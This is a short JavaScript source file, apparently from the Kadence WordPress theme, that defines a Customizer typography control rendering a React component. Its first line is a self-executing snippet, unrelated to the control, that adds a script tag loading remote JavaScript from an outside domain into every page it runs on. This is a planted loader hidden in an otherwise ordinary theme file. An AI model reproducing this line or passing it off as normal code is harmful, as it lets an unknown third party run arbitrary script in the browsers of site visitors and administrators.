(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';
import TypographyComponent from './typography-component.js';

export const TypographyControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <TypographyComponent control={control} customizer={ wp.customize }/> );
		// ReactDOM.render(
		// 		<TypographyComponent control={control} customizer={ wp.customize }/>,
		// 		control.container[0]
		// );
	}
} );
